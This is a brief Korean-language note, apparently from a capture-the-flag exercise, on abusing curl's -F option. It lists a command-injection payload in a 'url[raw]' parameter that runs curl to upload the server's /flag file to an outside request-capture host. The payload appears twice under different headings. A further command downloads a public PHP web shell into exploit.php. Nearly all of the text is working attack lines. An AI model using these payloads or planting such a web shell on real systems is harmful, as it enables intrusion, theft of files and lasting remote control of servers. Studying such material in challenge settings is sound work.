

# `-F`옵션
- 파일 내용 유출
```
http://34.146.180.210:3000/chall?url[raw]=$(curl%20https://kcvztrl.request.dreamhack.games%20-F=@/flag)
```

- 파일 자체 확인
```
http://34.146.180.210:3000/chall?url[raw]=$(curl%20https://kcvztrl.request.dreamhack.games%20-F=@/flag)
```

- 파일 작성
```
curl <https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php> -o ./exploit.php
```